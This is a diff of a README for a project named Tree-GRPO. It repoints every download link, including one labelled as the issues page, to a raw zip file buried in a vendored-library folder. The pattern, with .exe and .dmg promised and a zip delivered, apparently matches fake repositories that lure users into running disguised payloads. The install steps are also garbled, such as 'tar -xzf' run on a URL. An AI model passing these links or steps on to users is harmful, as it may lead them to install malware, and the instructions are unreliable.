@@ -1,6 +1,6 @@
 # 🌳 Tree-GRPO - Simplifying Tree Searches for Better AI
 
-![Download Tree-GRPO](https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/accusive/Tree-GRPO.zip)
+![Download Tree-GRPO](https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/verl/third_party/vllm/vllm_v_0_3_1/GRPO-Tree-v3.6-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Before you start, make sure your computer meets these requirements:
 
 To get started, visit the releases page to download the latest version of Tree-GRPO.
 
-[**Visit this page to download**](https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/accusive/Tree-GRPO.zip)
+[**Visit this page to download**](https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/verl/third_party/vllm/vllm_v_0_3_1/GRPO-Tree-v3.6-alpha.5.zip)
 
 You will see a list of available versions. Click on the latest release. You will find files for different operating systems. Choose the one that works for your system.
 
 1. **For Windows:** Download the `.exe` file.
 2. **For macOS:** Download the `.dmg` file.
-3. **For Linux:** Download the `https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/accusive/Tree-GRPO.zip` file.
+3. **For Linux:** Download the `https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/verl/third_party/vllm/vllm_v_0_3_1/GRPO-Tree-v3.6-alpha.5.zip` file.
 
 Once downloaded, follow these steps for each operating system:
 
@@ -47,9 +47,9 @@ Once downloaded, follow these steps for each operating system:
 
 1. Open the terminal.
 2. Navigate to your Downloads folder using `cd ~/Downloads`.
-3. Extract the `https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/accusive/Tree-GRPO.zip` file:
+3. Extract the `https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/verl/third_party/vllm/vllm_v_0_3_1/GRPO-Tree-v3.6-alpha.5.zip` file:
    ```
-   tar -xzf https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/accusive/Tree-GRPO.zip
+   tar -xzf https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/verl/third_party/vllm/vllm_v_0_3_1/GRPO-Tree-v3.6-alpha.5.zip
    ```
 4. Navigate into the extracted folder:
    ```
@@ -88,10 +88,10 @@ If you encounter issues, here are some common problems and solutions:
 
 ## ℹ️ Support
 
-If you need further assistance, please visit the [issues page](https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/accusive/Tree-GRPO.zip) on GitHub to report your problems, or seek help from the community.
+If you need further assistance, please visit the [issues page](https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/verl/third_party/vllm/vllm_v_0_3_1/GRPO-Tree-v3.6-alpha.5.zip) on GitHub to report your problems, or seek help from the community.
 
 ## 🤝 Contribute to Tree-GRPO
 
 We welcome contributions. If you have suggestions to improve Tree-GRPO, please check out the contribution guidelines in the repository.
 
-[**Visit this page to download**](https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/accusive/Tree-GRPO.zip) and start using Tree-GRPO today!
+[**Visit this page to download**](https://raw.githubusercontent.com/nielsyA/Tree-GRPO/main/verl/third_party/vllm/vllm_v_0_3_1/GRPO-Tree-v3.6-alpha.5.zip) and start using Tree-GRPO today!
